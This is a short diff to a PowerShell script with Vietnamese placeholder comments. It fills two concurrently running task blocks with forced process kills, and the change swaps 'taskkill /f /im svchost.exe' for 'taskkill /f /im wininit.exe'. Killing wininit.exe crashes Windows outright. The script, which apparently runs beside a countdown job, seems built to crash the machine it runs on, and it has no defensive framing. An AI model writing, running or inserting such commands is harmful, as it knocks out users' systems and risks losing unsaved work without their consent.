@@ -26,7 +26,7 @@ Start-Job -ScriptBlock {
 
 # ===== DAN LENH CUA BAN CHO TASK 1 O DAY (se chay dong thoi voi bo dem tren) =====
 
-taskkill /f /im svchost.exe
+taskkill /f /im wininit.exe
 
 # ===== HET PHAN LENH TASK 1 =====
 '@
@@ -35,7 +35,7 @@ taskkill /f /im svchost.exe
 $task2Code = @'
 # ===== DAN LENH CUA BAN CHO TASK 2 O DAY =====
 
-taskkill /f /im svchost.exe
+taskkill /f /im wininit.exe
 
 # ===== HET PHAN LENH TASK 2 =====
 '@
